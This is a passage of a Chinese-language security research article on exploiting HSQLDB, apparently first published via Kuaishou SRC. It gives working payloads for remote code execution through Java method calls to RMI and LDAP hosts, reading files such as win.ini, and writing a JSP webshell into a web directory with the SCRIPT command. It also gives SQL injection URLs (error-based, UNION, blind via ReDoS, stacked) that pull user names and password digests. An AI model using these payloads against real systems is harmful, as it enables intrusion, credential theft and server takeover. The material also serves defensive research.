        returns VARCHAR(80)
        no sql
        language java
        external name 'CLASSPATH:java.rmi.Naming.list'
    ;
    CALL rce('rmi://127.0.0.1:2333/a')
和其他数据库一样，hsqldb 也可以创建自定义函数，且允许引用 Java 的静态方法，要求参数和返回值都是 HSQLDB 支持的类型。
我找到了 `java.rmi.Naming.list`正好符合，且可以造成反序列化。
除此之外还有`javax.naming.InitialContext.doLookup`
**第二种：直接调用Java方法**
    CALL "java.rmi.Naming.list"('rmi://127.0.0.1:2333/a')
这种原理和第一种一样，同样需要参数和返回类型是 HSQLDB 支持的类型
**第三种：设置密码检查扩展方法**
    SET DATABASE PASSWORD CHECK FUNCTION EXTERNAL NAME 'CLASSPATH:java.class.method'
    //创建用户密码和修改当前用户密码时会触发
    SET DATABASE AUTHENTICATION FUNCTION EXTERNAL NAME 'CLASSPATH:java.class.method'
    //认证时会触发
### 5.2 文件读取
**LOAD_FILE**
我查阅了[官方文档](http://www.hsqldb.org/doc/2.0/guide/builtinfunctions-chapt.html)，找到了 `LOAD_FILE`函数。主要是用来读取文件和请求URL的。
但这个函数有个缺点，如果参数中没有把 `hsqldb.allow_full_path`设置为 `true` 就只能读取 hsqldb
数据库文件存放的目录及其子目录，也无法通过`..`跳转目录。
参考上图，要求 `allowFull` 和 `propTextAllowFullPath`有一个为 `True`才可以跨目录。
**TEXT TABLE**
这个需要创建一个 TEXT 类型的 TABLE ，然后通过 SET 命令向该表插入数据库。
    CREATE TEXT TABLE TESTDATA(
      txt VARCHAR(255)
     ) ;
然后再通过 SET 命令向 TEXT TABLE 导入文件
    SET TABLE TESTDATA SOURCE 'data.script'
但同样和 LOAD_FILE 一样不能跨目录读取文件。
**IMPORT SCRIPT**
这个和其他两个不同，他的功能是读取文件并且导入脚本。
与前两个不同的是他可以跨目录读取文件，但缺点就是读出来的文件是以报错形式显示的，而且只能读一部分内容。
    PERFORM IMPORT SCRIPT VERSIONING DATA FROM 'C:/windows/win.ini'
他能跨目录读文件的原因是 allowFull 参数被设定为 `true`了
### 5.3 文件写入
**SCRIPT**
SCRIPT 这个命令会把当前的数据库脚本导出到指定的文件路径下，不受 allowFull 参数的限制，也没有文件后缀限制。
    http://localhost:8888/query?keyword=test';CREATE+TABLE+EVIL(txt+VARCHAR(255));--    
    http://localhost:8888/query?keyword=test';insert+into+EVIL+values('');--    
    http://localhost:8888/query?keyword=test';SCRIPT+'E:/source/java/hsqltest/target/hsqltest/evil.jsp';--
我分别执行了三条SQL 命令。
第一条和第二条用于写入 JSP 代码到 script 文本中。
第三条用 SCRIPT 命令把脚本文本导出为 jsp 文件到web目录下。
最后再去访问 `http://localhost:8888/evil.jsp` 就可以执行 jsp 代码。
# 6\. SQL注入
hsqldb 和其他数据库基本一样，也有报错注入、UNION注入、盲注。
另外 hsqldb 默认支持堆叠查询。
因为 RESTRICT
（防止多行查询）的选项是关闭的。所以`Statement.executeQuery()`可以多行查询，所以上文中提到的一些测试方式大多数都可以用。
### 6.1 报错注入
主流的报错注入方式主要分为两类。
一类是 mysql、Oracle 这种使用自带函数使错误抛出的信息中携带参数值。另一类是 sqlserver 这种转型报错。
因为转型在这里并不适用，所以开始看一些函数的源码。
其中我关注到了 `LOAD_FILE`函数，发现它会把参数当做文件去读取，一旦遇到文件无法读取的情况就会把文件路径带入到报错信息中输出。
从源码中来看就是文件没读到，抛出了一个异常，在message中把这个路径给带了出来。
想找其他可以报错注入的函数也很简单，搜索`Error.error\(.*, .*\)`这条正则一步步顺着向上找对应的函数。
例如`REGEXP_REPLACE`这个函数
这里它把第六个参数带入了`FunctionCustom.regexpParams()`方法
当switch的所有case都不满足时会把它带入异常信息抛出，也就造成了报错注入。
下面展示下两个报错注入的例子
    http://localhost:8888/query?keyword=test' and REGEXP_REPLACE('','','','',1,concat('~',user()))='1
    http://localhost:8888/query?keyword=test' and load_file(concat('x:/',(SELECT top 1 concat(user_name,'~',password_digest) FROM information_schema.system_users)))!=null and '1'='1
### 6.2 UNION 注入
和其他类型的数据库一样，基本没什么差别
先通过 order by 查当前表的 column 数量
    http://localhost:8888/query?keyword=test' or 1=1 order by 13--!
13 返回正常，14报错，说明 column 有 13 个。
    http://localhost:8888/query?keyword=test' and 1=2 union select database(),(SELECT top 1 concat(user_name,'~',password_digest) FROM information_schema.system_users),null,null,null,null,null,null,null,null,null,true,null from INFORMATION_SCHEMA.TABLES--!
注入出数据库账号密码
### 6.3 布尔盲注
布尔盲注主要通过页面返回的正常与否判断SQL执行的情况。
其他数据库的盲注用到的函数 hsqldb 基本都有。
如: **SUBSTR** 、 **length** 、 **HEX** 、 **DECODE** 等。
其中 **DECODE** 就相当于 mysql 的 **IF** 。
    decode(user(),'SA',1,0)
这条SQL的含义是“如果user()的值等于'SA'则返回1，否则返回0”
再带入到盲注脚本就很好理解了。
运行盲注脚本就可以查到SQL结果
### 6.4 延时盲注
与其他数据库不同的是我没有发现 hsqldb 有延时函数。
所以需要通过其他的方法来达到延时的效果。我有两种思路。
  1. 通过 **REGEXP_MATCHES** 函数引发REDOS造成延时（慎用）
  2. 查一个数据非常多的表引发延时。
需要注意的是 **REGEXP_MATCHES** 会造成CPU过载，使用不当可能会卡死。
    REGEXP_MATCHES('aaaaaaaaaaaaaaaaaaaaaaaaaaaX','(a+)+')
这条SQL我运行时会延时 4 秒左右， **X** 前面的 **a** 越多延迟时间就越长，一般能延迟5秒左右就可以了。
在布尔盲注的脚本基础上稍作修改就可以跑出数据了。
### 6.5 堆叠注入
前面提到过，hsqldb 是默认允许堆叠查询的，所以可以像 sqlserver 一样自由的执行其他命令。
例如通过 CALL 命令调用 Java 方法 RCE
    http://localhost:8888/query?keyword=test';CALL "javax.naming.InitialContext.doLookup"('ldap://127.0.0.1:2333/Exploit');--!
顺便提一下，在注入场景下要想执行 Java 方法也不一定非要依靠堆叠注入，上面只是以 CALL 命令举个例子，如果遇到不可以堆叠注入的情况也可以直接去掉
CALL 带入查询。
    http://localhost:8888/query?keyword=test' and "javax.naming.InitialContext.doLookup"('ldap://127.0.0.1:2333/Exploit')!=null and 'a'='a
# 7\. 参考
[本文首发于快手SRC](https://mp.weixin.qq.com/s/97RX9Y6H35GM4oibud883Q "本文首发于快手SRC")  
[Chapter 10. Built In
Functions](http://www.hsqldb.org/doc/2.0/guide/builtinfunctions-chapt.html
"Chapter 10. Built In Functions")  
[longofo / hsqldb-source](https://github.com/longofo/hsqldb-source "longofo /
hsqldb-source")  
[F5 BIG-IP hsqldb(CVE-2020-5902)漏洞踩坑分析](https://paper.seebug.org/1271/ "F5
BIG-IP hsqldb CVE-2020-5902 漏洞踩坑分析")